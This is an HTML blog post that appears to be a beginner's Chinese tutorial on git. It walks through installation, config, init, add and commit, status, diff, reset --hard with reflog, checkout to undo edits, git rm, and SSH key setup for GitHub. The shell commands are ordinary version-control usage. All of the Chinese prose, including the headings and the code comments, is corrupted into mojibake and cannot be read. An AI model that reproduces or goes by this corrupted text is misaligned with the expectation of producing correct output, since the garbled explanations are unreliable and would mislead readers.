    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>çœ‹äº†å¾ˆå¤šæ•™ç¨‹ï¼Œå‘ç°è¿˜æ˜¯å¾ˆå¤šä¸œè¥¿è®°ä¸ä½ï¼Œå¦‚æœä¸å†™å†™çš„è¯ä¸¤å¤©å°±å¿˜äº†ï¼Œæ‰€ä»¥è®°ä¸€ä¸‹ç¬”è®°ã€‚ä¸ºäº†è®©åˆ«äººæœ‰æ•™ç¨‹çš„æ„Ÿè§‰ï¼Œå¯¹ç¬”è®°è¿›è¡Œäº†ç”±æµ…å…¥æ·±çš„æ’åºï¼Œå¯ä»¥å¸®ä½ ä»¬å¿«é€Ÿå…¥é—¨ã€‚</p>
<h3 id="gitç”±æ¥"><a href="#gitç”±æ¥" class="headerlink" title="gitç”±æ¥"></a>gitç”±æ¥</h3><p>linuxåœ¨åæœŸçš„å¼€å‘è¿‡ç¨‹ä¸­å¼€å‘äººå‘˜å’Œä»£ç é‡å·¨å¤§ï¼Œæ€¥éœ€ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œåˆšå¼€å§‹æœ‰å…¬å¸èµåŠ©ç»™ä»–ä»¬ç”¨ï¼Œåæ¥ä»–ä»¬è¯•å›¾ç ´è§£è¿™ä¸ªå·¥å…·(ç¡®å®å¾ˆä½œæ­»)ï¼Œäººå®¶ä¸ç»™ä»–ç”¨äº†ï¼Œè¿™äº›linux coderä¸€æ°”ä¹‹ä¸‹ç”¨Cå¼€å‘äº†åˆä»£çš„gitï¼Œåæ¥ç«äº†ä¹‹ååˆåœ¨2008å¹´åšäº†githubç½‘ç«™æ‰˜ç®¡å…¨çƒä»£ç ï¼Œä»æ­¤gitèµ°å…¥åƒå®¶ä¸‡æˆ·ã€‚<br>gitæ˜¯åˆ†å¸ƒå¼çš„ï¼Œä½†æ˜¯æˆ‘ä»¬æ™®é€šäººç”¨èµ·æ¥å’Œé›†ä¸­å¼æ²¡æœ‰åŒºåˆ«ã€‚æ‰€ä»¥ä¸ç”¨ç®¡è¿™ä¸ªæ¦‚å¿µã€‚</p>
<span id="more"></span>

<h3 id="å®‰è£…git"><a href="#å®‰è£…git" class="headerlink" title="å®‰è£…git"></a>å®‰è£…git</h3><p>linux :  sudo apt-get install git<br>mac:   å®‰è£…homebrew - &gt; å®‰è£…git   å®‰è£…xcode - &gt; preferences-&gt;downloads-&gt;Command Line Tools-&gt;install<br>window: <a href=https://git-scm.com/downloads>å®˜æ–¹å®‰è£…ç¨‹åºé“¾æ¥ï¼Œæ¨èå®‰è£…setupç‰ˆè€Œä¸æ˜¯portableç‰ˆ</a><br>å®‰è£…å®Œä»¥åéœ€è¦ä½ è¿›è¡Œè®¾ç½®æ ‡è®°ä¸‹æ˜¯è°çš„github ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">&quot;name or nick name&quot;</span></span><br><span class="line">$ git config --global user.email <span class="string">&quot;email@example.com&quot;</span></span><br><span class="line"><span class="comment">#git config çš„ --globalå‚æ•° è¡¨ç¤ºæ­¤ç”µè„‘æ‰€æœ‰gitä»“åº“éƒ½ä½¿ç”¨è¿™ä¸ªé…ç½®</span></span><br></pre></td></tr></table></figure>

<h3 id="ç‰ˆæœ¬åº“"><a href="#ç‰ˆæœ¬åº“" class="headerlink" title="ç‰ˆæœ¬åº“"></a>ç‰ˆæœ¬åº“</h3><p>ç‰ˆæœ¬åº“å°±æ˜¯ä¸€ä¸ªå°å°çš„ä»“åº“ï¼Œè¿™ä¸ªä»“åº“ç”±gitç®¡ç†ï¼Œé‡Œé¢ä»»ä½•ä¸œè¥¿çš„å˜åŠ¨å®ƒéƒ½çŸ¥é“ï¼Œåœ¨ç”µè„‘ä¸Šå®ƒå°±æ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹ã€‚<br>æˆ‘ä»¬æ¥åˆ›å»ºä¸€ä¸ªä»“åº“ï¼ˆæ–‡ä»¶ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> testforgit</span><br><span class="line"><span class="built_in">cd</span> testforgit</span><br><span class="line">git init </span><br><span class="line"><span class="comment">#ä¸Šé¢ä¸‰æ­¥æˆ‘ä»¬åˆ›å»ºäº†testforgitæ–‡ä»¶å¤¹ï¼Œç„¶ååˆå§‹åŒ–å®ƒä¸ºä»“åº“äº¤ç”±gitç®¡ç†</span></span><br><span class="line"><span class="comment">#æˆ‘ä»¬å¯ä»¥ ls -la çœ‹ä¸‹å½“å‰ç›®å½•ä¸‹æœ‰ä¸€ä¸ª.gitæ–‡ä»¶ è¿™ä¸ªæ–‡ä»¶å°±æ˜¯ç”¨æ¥è·Ÿè¸ªè®°å½•è¿™ä¸ªä»“åº“çš„ã€‚</span></span><br><span class="line"><span class="comment">#æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆå§‹åŒ–ä¸€ä¸ªéç©ºçš„ä»“åº“</span></span><br><span class="line"><span class="comment">#æ³¨æ„ï¼šgitåªèƒ½ç®¡æ§æ–‡æœ¬æ–‡æ¡£ï¼Œæ‰€ä»¥å›¾ç‰‡ï¼Œwordç­‰äºŒè¿›åˆ¶æ–‡ä»¶ä»–åªèƒ½ç®¡æ§è®°å½•å¤§å°çš„æ›´æ”¹ï¼Œæ— æ³•çŸ¥é“å›¾ç‰‡æ–‡ä»¶ä¸­çš„å…·ä½“å“ªè¡Œè¢«æ›´æ”¹äº†ã€‚</span></span><br><span class="line"><span class="comment">#æ³¨æ„ï¼šåˆå§‹åŒ–å®Œæˆåä¼šç”Ÿæˆ.gitæ–‡ä»¶å¤¹ï¼Œæˆ‘ä»¬æœ€å¥½ä¸è¦æ‰‹åŠ¨å»ä¿®æ”¹é‡Œé¢çš„ä¸œè¥¿ï¼Œè¿™å°±åƒæ˜¯å°å·ä¸€æ ·ï¼Œä¸è·Ÿç®¡ç†å‘˜è¯´æèµ°ä¸€ä¸ªï¼Œgitç®¡ç†å‘˜å¯èƒ½è‡ªå·±æ··ä¹±ï¼Œä»“åº“ä¹Ÿè¢«ç ´åäº†ã€‚</span></span><br></pre></td></tr></table></figure>
<p>åˆå§‹å®Œä»¥åæˆ‘ä»¬éœ€è¦å°è¯•å†™ä¸€ä¸ªæ–‡ä»¶ï¼Œæ¯”å¦‚readme.txt å†™å®Œæ”¾å…¥gitç®¡æ§çš„ç›®å½•ä¸‹ï¼Œè¿™æ ·gitæ‰èƒ½æ‰¾åˆ°å®ƒï¼Œç„¶åæˆ‘ä»¬ä¸¤æ­¥æäº¤æ­¤æ–‡ä»¶åˆ°æœåŠ¡å™¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git add readme.txt</span><br><span class="line">$ git commit -m <span class="string">&quot;add 3 files.&quot;</span></span><br><span class="line"><span class="comment"># -m å‚æ•°æ˜¯è¯´æ˜çš„æ„æ€ï¼Œå¼ºçƒˆå»ºè®®æ¯ä¸ªcommitå†™è¯´æ˜</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸ºä»€ä¹ˆéœ€è¦ä¸¤æ­¥ï¼Ÿå› ä¸ºè¿™æ ·ä½ å¯ä»¥addå¤šä¸ªæ–‡ä»¶ï¼Œç„¶åä¸€èµ·commitåˆ°æœåŠ¡å™¨,å…¶ä¸­git addæ˜¯æäº¤åˆ°æš‚å­˜åŒºï¼ŒgitcommitæŠŠæš‚å­˜åŒºçš„æ‰€æœ‰æ–‡ä»¶ä¸€èµ·æäº¤</span></span><br><span class="line">$ git add file1.txt </span><br><span class="line">$ git add file2.txt file3.txt</span><br><span class="line">$ git commit -m <span class="string">&quot;add 3 files.&quot;</span></span><br><span class="line"><span class="comment">#æ–‡ä»¶å¤¹å°±æ˜¯å·¥ä½œåŒºï¼Œè€Œ add æ˜¯æäº¤æ–‡ä»¶åˆ°æš‚å­˜åŒºï¼Œè¿™ä¸ªæ¦‚å¿µå¾ˆé‡è¦ã€‚ä¸€å®šè¦è®°ä½å•Šå“¦ï¼</span></span><br><span class="line"><span class="comment">#å¦‚æœä½ æœ‰ä¸€ä¸ªæ–‡ä»¶readme.txtä¿®æ”¹ä¸€æ¬¡ git addäº† ç„¶åå®ƒå°±è¿›å…¥äº†æš‚å­˜åŒºï¼Œæ­¤æ—¶æœ¬åœ°å†æ¬¡ä¿®æ”¹readme.txt å†æ¬¡git addï¼Œæ­¤æ—¶ä¸¤æ¬¡ä¿®æ”¹å°±è¢«gitåˆå¹¶å­˜åœ¨æš‚å­˜åŒºï¼Œæ­¤æ—¶commitçš„å°±æ˜¯æœ€æ–°çš„ä¿®æ”¹äº†ï¼</span></span><br><span class="line"><span class="comment">#æ‰€ä»¥åˆ‡è®°ï¼Œcommitåªèƒ½æäº¤å­˜å‚¨åœ¨æš‚å­˜åŒºçš„æ–‡ä»¶</span></span><br></pre></td></tr></table></figure>

<h3 id="åŸºç¡€å‘½ä»¤"><a href="#åŸºç¡€å‘½ä»¤" class="headerlink" title="åŸºç¡€å‘½ä»¤"></a>åŸºç¡€å‘½ä»¤</h3><h5 id="ä¿®æ”¹æ–‡ä»¶"><a href="#ä¿®æ”¹æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹æ–‡ä»¶"></a>ä¿®æ”¹æ–‡ä»¶</h5><p>æˆ‘ä»¬ä¿®æ”¹readmeæ–‡ä»¶ï¼Œç„¶åé€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹åŒºåˆ«ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line"><span class="comment">#ä¼šæ˜¾ç¤ºé‚£äº›ä»£ç è¢«ä¿®æ”¹äº†ï¼Œæˆ‘ä»¬ç”»ä¸ªåƒåœ¾è‰å›¾</span></span><br><span class="line">	          |  -&gt; untracked files     <span class="comment">#ä»æ²¡æœ‰git addè¿‡çš„æ–‡ä»¶ï¼Œå³ä¸è¢«gitè¿½è¸ªçš„æ–‡ä»¶</span></span><br><span class="line">æ–‡ä»¶statusåˆ†ä¸º | -&gt; çº¢è‰² modify           <span class="comment">#ä¿®æ”¹è¿‡ï¼Œä½†æ˜¯æ²¡æœ‰add</span></span><br><span class="line">              |  -&gt; ç»¿è‰² modify          <span class="comment">#ä¿®æ”¹è¿‡ git addå®Œäº† ä½†æ˜¯è¿˜æ²¡æœ‰ commit</span></span><br><span class="line"><span class="comment">#å¦‚æœå½“å‰æ²¡æœ‰ä»»ä½•æ”¹åŠ¨ï¼Œåˆ™ä¼šæ˜¾ç¤ºï¼š</span></span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br><span class="line"></span><br><span class="line">$ git diff readme.txt</span><br><span class="line"><span class="comment">#æŸ¥çœ‹readme.txtå’Œæ–‡ä»¶æœåŠ¡å™¨ä¸Šçš„ç‰ˆæœ¬æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œå¯ä»¥æ¸…æ¥šçš„çŸ¥é“æ”¹äº†å“ªäº›å†…å®¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ç„¶åä½ å°±å¯ä»¥ç»§ç»­æäº¤äº†</span></span><br><span class="line">$ git add</span><br><span class="line">$ git commit -m</span><br></pre></td></tr></table></figure>

<h5 id="ç‰ˆæœ¬å›é€€"><a href="#ç‰ˆæœ¬å›é€€" class="headerlink" title="ç‰ˆæœ¬å›é€€"></a>ç‰ˆæœ¬å›é€€</h5><p>ä¿®æ”¹å®Œæ–‡ä»¶åæˆ‘ä»¬åæ‚”äº†ï¼Œæˆ–è€…è¯´æˆ‘ä»¬ä¿®æ”¹å®Œçš„ä»£ç å´©æºƒäº† è°ƒä¸è¿‡æ¥äº†ï¼Œæˆ‘ä»¬æƒ³å›é€€åˆ°ä»¥å‰èƒ½æ­£å¸¸è¿è¡Œçš„ç‰ˆæœ¬ã€‚å¥½ï¼Œè¿™åœ¨gitæ˜¯éå¸¸æ–¹ä¾¿çš„ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æˆ‘ä»¬é¦–å…ˆçœ‹ä¸‹ç°åœ¨çš„reamdeæ–‡ä»¶å†…å®¹</span></span><br><span class="line">$ <span class="built_in">cat</span> readme.txt</span><br><span class="line">t is a version control system</span><br><span class="line">add2</span><br><span class="line">add3</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç”¨git log æŸ¥çœ‹æˆ‘ä»¬ä¸€å…±æäº¤äº†å¤šå°‘ä¸ªç‰ˆæœ¬</span></span><br><span class="line">$ git <span class="built_in">log</span></span><br><span class="line">commit 97f63044c14952fc5d13a08a8448aded163de489 (HEAD -&gt; master)</span><br><span class="line">Author: geeeez &lt;gz54321.a@gmail.com&gt;</span><br><span class="line">Date:   Tue Nov 5 11:07:24 2019 +0800</span><br><span class="line"></span><br><span class="line">    add3</span><br><span class="line"></span><br><span class="line">commit 4aae9f796a8440a0a6eb882ed99596a5fb1b5a40</span><br><span class="line">Author: geeeez &lt;gz54321.a@gmail.com&gt;</span><br><span class="line">Date:   Tue Nov 5 11:06:58 2019 +0800</span><br><span class="line"></span><br><span class="line">    add2</span><br><span class="line"></span><br><span class="line">commit cedeb93177ea09827758cdf1491a7f009ac4ef25</span><br><span class="line">Author: geeeez &lt;gz54321.a@gmail.com&gt;</span><br><span class="line">Date:   Mon Nov 4 23:05:19 2019 +0800</span><br><span class="line"></span><br><span class="line">    learn git</span><br><span class="line"></span><br><span class="line"><span class="comment">#æˆ‘ä»¬ä¸€å…±ä¿®æ”¹äº†ä¸¤æ¬¡ï¼Œåˆ†åˆ«åŠ å…¥äº†add2 å’Œ add3 ï¼Œå…¶ä¸­æœ‰HEAD -&gt; masterè¡¨ç¤ºçš„ä»£è¡¨å½“å‰ç‰ˆæœ¬ï¼Œcommitåé¢ä»£è¡¨çš„æ˜¯ç‰ˆæœ¬å”¯ä¸€idï¼Œä¸‹é¢å°±æ˜¯ä¸€äº›ä¿®æ”¹å†…å®¹ï¼Œå¦‚æœæˆ‘ä»¬æƒ³å›é€€ä¸Šæ¬¡ç‰ˆæœ¬(add2) åªéœ€</span></span><br><span class="line">$ git reset --hard HEAD^</span><br><span class="line"></span><br><span class="line"><span class="comment">#å›é€€ä¸Šä¸Šæ¬¡</span></span><br><span class="line">$ git reset --hard HEAD^^</span><br><span class="line"></span><br><span class="line"><span class="comment">#å›é€€ä¸Šä¸€ç™¾æ¬¡å‘¢ï¼Ÿéš¾é“è¦ä¸€ç›´å†™^?å½“ç„¶ä¸æ˜¯ï¼Œè¿™ä¸æ˜¯gitçš„å“²å­¦ã€‚æˆ‘ä»¬å¯ä»¥~åŠ æ¬¡æ•°</span></span><br><span class="line">HEAD~100</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä½†æ˜¯å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¸ä¼šå»å±æ¬¡æ•°ï¼Œæ‰€ä»¥è¿˜æœ‰ä¸€å¼ æ–¹æ³•ï¼Œå’Œdockerä¸€æ · æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡idè¿›è¡Œå›æ»š</span></span><br><span class="line">$ git reset --hard 1094a</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç°åœ¨æˆ‘ä»¬å›é€€åˆ°ç‰ˆæœ¬idä¸º cedebï¼ˆä¸éœ€è¦å†™å…¨ï¼Œå’Œdockerä¸€æ ·ï¼‰</span></span><br><span class="line">$ git reset --hard cedeb</span><br><span class="line">HEAD is now at cedeb93 learn git</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç°åœ¨å†æ¥çœ‹çœ‹readme.txtçš„å†…å®¹å§ï¼Œå¯ä»¥çœ‹åˆ°add2 å’Œ add3 éƒ½æ¶ˆå¤±äº†</span></span><br><span class="line">t is a version control system</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ­¤æ—¶æˆ‘ä»¬å†çœ‹git log å‘ç° cedebä¹‹åçš„ç‰ˆæœ¬å…¨éƒ¨æ¶ˆå¤±äº†ï¼Œé‚£æˆ‘ä»¬åæ‚”äº†ä¸æƒ³å›é€€äº†ï¼Œè¿˜æƒ³æ‰¾å›æœ€æ–°çš„ç‰ˆæœ¬æ€ä¹ˆåŠï¼Ÿ</span></span><br><span class="line"><span class="comment">#è¿™åœ¨gitä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæˆ‘ä»¬æœ‰ä¸ªå‘½ä»¤git reflog è®°å½•äº†ä½ çš„æ‰€æœ‰æ“ä½œ</span></span><br><span class="line">$ git reflog</span><br><span class="line">cedeb93 (HEAD -&gt; master) HEAD@&#123;0&#125;: reset: moving to cedeb</span><br><span class="line">97f6304 HEAD@&#123;1&#125;: commit: add3</span><br><span class="line">4aae9f7 HEAD@&#123;2&#125;: commit: add2</span><br><span class="line">cedeb93 (HEAD -&gt; master) HEAD@&#123;3&#125;: reset: moving to <span class="built_in">head</span>^</span><br><span class="line">d947e60 HEAD@&#123;4&#125;: commit: <span class="built_in">test</span></span><br><span class="line">cedeb93 (HEAD -&gt; master) HEAD@&#123;5&#125;: commit (initial): learn git</span><br><span class="line"></span><br><span class="line"><span class="comment">##é€šè¿‡ä¸Šè¿°çš„ç‰ˆæœ¬idï¼Œä½ å¯ä»¥æ¢å¤åˆ°ä»»ä½•ä½ commmitè¿‡çš„ç‰ˆæœ¬ã€‚æ˜¯ä¸æ˜¯å¾ˆç®€å•å•Šï¼</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="æ’¤é”€ä¿®æ”¹"><a href="#æ’¤é”€ä¿®æ”¹" class="headerlink" title="æ’¤é”€ä¿®æ”¹"></a>æ’¤é”€ä¿®æ”¹</h5><p>æœ‰ä¸€å¤©ä½ åœ¨å†™ä»£ç ï¼Œæœ¬æ¥æ²¡å•¥äº‹ï¼Œç»“æœç­‰ä½ ç¬¬äºŒå¤©èµ·æ¥çš„æ—¶å€™å‘ç°æ˜¨æ™šå†™çš„å·¥ä½œåŒºä»£ç æœ‰å¾ˆå¤šbugï¼Œbugå¤šåˆ°æ‡’å¾—è°ƒè¯•ï¼Œæ­¤æ—¶ä½ å¯ä»¥ä¸€è¡Œä¸€è¡Œçš„æŸ¥æ‰¾åˆ é™¤ä¿®æ”¹ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å›æ»šç‰ˆæœ¬ï¼Œä½†æ˜¯ä½ å‘ç°å‡ºé—®é¢˜çš„ä»£ç ä»…å­˜åœ¨åœ¨ login.phpä¸­ï¼Œäºæ˜¯ä½ æƒ³æœ‰æ²¡æœ‰ä¸€ç§åŠæ³•å›æ»šå•ä¸ªæ–‡ä»¶ï¼Ÿå˜¿å˜¿ ç¡®å®æœ‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git checkout -- login.php</span><br><span class="line"><span class="comment">#å‘½ä»¤git checkout -- login.php æ„æ€å°±æ˜¯ï¼ŒæŠŠlogin.phpæ–‡ä»¶åœ¨å·¥ä½œåŒºçš„ä¿®æ”¹å…¨éƒ¨æ’¤é”€ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æƒ…å†µï¼š</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸€ç§æ˜¯login.phpè‡ªä¿®æ”¹åè¿˜æ²¡æœ‰è¢«æ”¾åˆ°æš‚å­˜åŒºï¼Œç°åœ¨ï¼Œæ’¤é”€ä¿®æ”¹å°±å›åˆ°å’Œç‰ˆæœ¬åº“ä¸€æ¨¡ä¸€æ ·çš„çŠ¶æ€ï¼›</span></span><br><span class="line"><span class="comment">#ä¸€ç§æ˜¯login.phpå·²ç»æ·»åŠ åˆ°æš‚å­˜åŒºåï¼Œåˆä½œäº†ä¿®æ”¹ï¼Œç°åœ¨ï¼Œæ’¤é”€ä¿®æ”¹å°±å›åˆ°æ·»åŠ åˆ°æš‚å­˜åŒºåçš„çŠ¶æ€ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ€»ä¹‹ï¼Œå°±æ˜¯è®©è¿™ä¸ªæ–‡ä»¶å›åˆ°æœ€è¿‘ä¸€æ¬¡git commitæˆ–git addæ—¶çš„çŠ¶æ€ã€‚</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šæ¬¡é€ƒè¿‡ä¸€åŠ«ï¼Œç„¶åä½ å°±æ”¾æ¾è­¦æƒ•äº†ï¼ŒæŸå¤©æ™šä¸Šä½ åˆåœ¨login.phpå†™äº†ä¸€å †æ¼æ´ï¼Œç„¶åè¿˜git addåˆ°äº†æš‚å­˜åŒºï¼Œä½†æ˜¯ä½ è¿˜æ²¡æœ‰commitï¼Œè¿™æ—¶å€™å¦‚æœç”¨ä¸Šé¢çš„å‘½ä»¤æ˜¯æ²¡ç”¨çš„ï¼Œå› ä¸ºä¸Šé¢çš„å‘½ä»¤åŒæ ·åªèƒ½æ¢å¤åˆ°æäº¤åˆ°æš‚å­˜åŒºçš„çŠ¶æ€ï¼Œäºæ˜¯ä½ æ™šä¸Šå¤§å“­å¤§é—¹ï¼Œè§‰å¾—è‡ªå·±çœŸæ˜¯stupidï¼Œä¸è¿‡git å¯ä»¥å¸®ä½ ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset HEAD &lt;file&gt;</span><br><span class="line"><span class="comment">#reset å¯ä»¥å›é€€ç‰ˆæœ¬ ä¹Ÿå¯ä»¥æŠŠæ–‡ä»¶ä»æš‚å­˜åŒºå›é€€å›æ¥ï¼Œè¿™æ ·å°±æ²¡æœ‰git addäº† æˆ‘ä»¬åˆå¯ä»¥ç”¨ $ git checkout -- login.php å›æ»šåˆ°ä¸Šä¸ªcommit çš„ login.phpäº† </span></span><br></pre></td></tr></table></figure>

<p>å˜¿å˜¿ï¼Œæ™šä¸Šç»ˆäºå¯ä»¥æ—©ç‚¹ç¡è§‰äº†ï¼</p>
<h5 id="åˆ é™¤æ–‡ä»¶"><a href="#åˆ é™¤æ–‡ä»¶" class="headerlink" title="åˆ é™¤æ–‡ä»¶"></a>åˆ é™¤æ–‡ä»¶</h5><p>å½“ä½ åˆ é™¤æœ¬åœ°åº“çš„readme.txtæ–‡ä»¶æ—¶  git status ä¼šæ˜¾ç¤ºå’Œç‰ˆæœ¬åº“çš„æ–‡ä»¶ä¸ä¸€è‡´ ä¼šæ˜¾ç¤ºä½ åˆ é™¤äº†é‚£ä¸ªæ–‡ä»¶ã€‚</p>
<p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ é™¤ç‰ˆæœ¬åº“çš„æ–‡ä»¶ git rm readme.txt  ç„¶åå†æ¬¡commit    ä¸€ä¸‹ï¼Œè¿™æ ·ç‰ˆæœ¬åº“å’Œæœ¬åœ°åº“å°±åŒæ­¥äº†ã€‚æ–‡ä»¶å°±åˆ é™¤å®Œæˆã€‚</p>
<p>å¦‚æœä½ æ˜¯ä¸å°å¿ƒåˆ é™¤çš„ï¼Œé‚£å°±æ˜¯æ¢å¤åŠŸèƒ½äº†ï¼Œç›´æ¥ç”¨ä¸Šé¢çš„git checkout â€“ readme.txt</p>
<h3 id="gitæ ¸å¿ƒåŠŸèƒ½è¿œç¨‹ä»“åº“æ¥äº†"><a href="#gitæ ¸å¿ƒåŠŸèƒ½è¿œç¨‹ä»“åº“æ¥äº†" class="headerlink" title="gitæ ¸å¿ƒåŠŸèƒ½è¿œç¨‹ä»“åº“æ¥äº†"></a>gitæ ¸å¿ƒåŠŸèƒ½è¿œç¨‹ä»“åº“æ¥äº†</h3><p>æˆ‘ä»¬æŒæ¡äº†gitçš„åŸºç¡€å‘½ä»¤åå‘ç°gitå’Œsvnä¹Ÿç¡®å®æ²¡å•¥å¤§åŒºåˆ«ï¼Œä½†æ˜¯ä¸ºå•¥é‚£ä¹ˆå¤šäººç”¨gitå‘¢ï¼Ÿæ¥ä¸‹æ¥å°±æ˜¯gitæ–¹ä¾¿çš„åœ°æ–¹äº†ï¼ŒåŒæ—¶é€šè¿‡è¿™ä¸ªä¹Ÿå¯ä»¥çŸ¥é“ä¸ºå•¥githubé‚£ä¹ˆå—æ¬¢è¿ã€‚</p>
<p>gitè¿œç¨‹ä»“åº“å¯ä»¥æ­å»ºåœ¨ä»»æ„ä¸€å°ç”µè„‘ä¸Šï¼Œå¤§å®¶éƒ½ä»¥å®ƒä¸ºä»“åº“æ¥æ‹‰å–å’Œæäº¤ä»£ç ï¼Œä½†æ˜¯å¯¹äºå°å…¬å¸æ¥è¯´æ²¡æœ‰å¿…è¦è‡ªå·±å»æ­å»ºä¸€ä¸ªgitæœåŠ¡å™¨ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠgithubå½“ä½œä¸€ä¸ªäº‘ç«¯ç”µè„‘å³å¯ã€‚ï¼ˆçœæ—¶çœåŠ›çœé’±ï¼‰</p>
<h5 id="å…è´¹çš„gitä»“åº“"><a href="#å…è´¹çš„gitä»“åº“" class="headerlink" title="å…è´¹çš„gitä»“åº“"></a>å…è´¹çš„gitä»“åº“</h5><p>æˆ‘ä»¬åªéœ€è¦æ³¨å†Œä¸€ä¸ªgithubå°±è·å¾—äº†ä¸€ä¸ªå…è´¹çš„githubä»“åº“ï¼Œä¸‹é¢æˆ‘ä»¬éœ€è¦é…ç½®è¿™ä¸ªä»“åº“ä½¿å¾—æˆ‘ä»¬æœ¬åœ°å’Œäº‘ç«¯githubä»“åº“å®‰å…¨ä¼ è¾“ä»£ç å’Œæ•°æ®ã€‚</p>
<p>1ã€é¦–å…ˆæˆ‘ä»¬åˆ›å»ºSSH keyï¼Œåœ¨ç”¨æˆ·ä¸»ç›®å½•ä¸‹ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰.sshç›®å½•ï¼Œå¦‚æœæœ‰ï¼Œå†çœ‹çœ‹è¿™ä¸ªç›®å½•ä¸‹æœ‰æ²¡æœ‰id_rsaå’Œid_rsa.pubè¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¦‚æœå·²ç»æœ‰äº†ï¼Œå¯ç›´æ¥è·³åˆ°ä¸‹ä¸€æ­¥ã€‚å¦‚æœæ²¡æœ‰ï¼Œæ‰“å¼€Shellï¼ˆWindowsä¸‹æ‰“å¼€Git Bashï¼‰ï¼Œåˆ›å»ºSSH Keyï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;yourmail@mail.com&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å‰©ä¸‹çš„ä¸€è·¯å›è½¦é€‰æ‹©é»˜è®¤å€¼å³å¯ï¼Œå½“ç„¶å¦‚æœä½ æƒ³ç»™ä½ çš„keyè®¾ç½®å¯†ç ä¹Ÿå¯ä»¥ï¼ˆè¿‡ç¨‹ä¸­ç›´æ¥è¾“å…¥å¯†ç ï¼‰ï¼Œä¸è¿‡æˆ‘è¿™é‡Œå°±ä¸è®¾ç½®äº†ã€‚</p>
<p>ç„¶åæˆ‘ä»¬å°±åˆ›å»ºæˆåŠŸäº†ï¼Œè¿™æ—¶å€™ä½ çš„ç”¨æˆ·ä¸»ç›®å½•ä¸‹æœ‰.sshæ–‡ä»¶å¤¹ï¼Œé‡Œé¢åˆ†åˆ«æ˜¯id_rsaå’Œid_rsa.pubã€‚è¿™ä¸¤ä¸ªå°±æ˜¯SSH Keyçš„ç§˜é’¥å¯¹ï¼Œid_rsaæ˜¯ç§é’¥ï¼Œä¸èƒ½æ³„éœ²å‡ºå»ï¼Œid_rsa.pubæ˜¯å…¬é’¥ï¼Œå¯ä»¥æ”¾å¿ƒåœ°å‘Šè¯‰ä»»ä½•äººã€‚</p>
<p>2ã€ç™»å½•githubæ·»åŠ å…¬é’¥ã€‚ç™»å½•åç‚¹å‡»å¤´å‘ä¸‹æ‹‰èœå•æ‰¾åˆ°settings,ç„¶åç‚¹å‡»SSH and GPG keysã€‚ç„¶ånewä¸€ä¸ªæ–°çš„SSH keysï¼š<img data-src="C:\Users\ThinkPadã€\AppData\Roaming\Typora\typora-user-images\1575614058950.png" alt="1575614058950"><br>ä¸ºä»€ä¹ˆGitHubéœ€è¦SSH Keyå‘¢ï¼Ÿå› ä¸ºGitHubéœ€è¦è¯†åˆ«å‡ºä½ æ¨é€çš„æäº¤ç¡®å®æ˜¯ä½ æ¨é€çš„ï¼Œè€Œä¸æ˜¯åˆ«äººå†’å……çš„ï¼Œè€ŒGitæ”¯æŒSSHåè®®ï¼Œæ‰€ä»¥ï¼ŒGitHubåªè¦çŸ¥é“äº†ä½ çš„å…¬é’¥ï¼Œå°±å¯ä»¥ç¡®è®¤åªæœ‰ä½ è‡ªå·±æ‰èƒ½æ¨é€ã€‚</p>
<p>å½“ç„¶ï¼ŒGitHubå…è®¸ä½ æ·»åŠ å¤šä¸ªKeyã€‚å‡å®šä½ æœ‰è‹¥å¹²ç”µè„‘ï¼Œä½ ä¸€ä¼šå„¿åœ¨å…¬å¸æäº¤ï¼Œä¸€ä¼šå„¿åœ¨å®¶é‡Œæäº¤ï¼Œåªè¦æŠŠæ¯å°ç”µè„‘çš„Keyéƒ½æ·»åŠ åˆ°GitHubï¼Œå°±å¯ä»¥åœ¨æ¯å°ç”µè„‘ä¸Šå¾€GitHubæ¨é€äº†ã€‚</p>
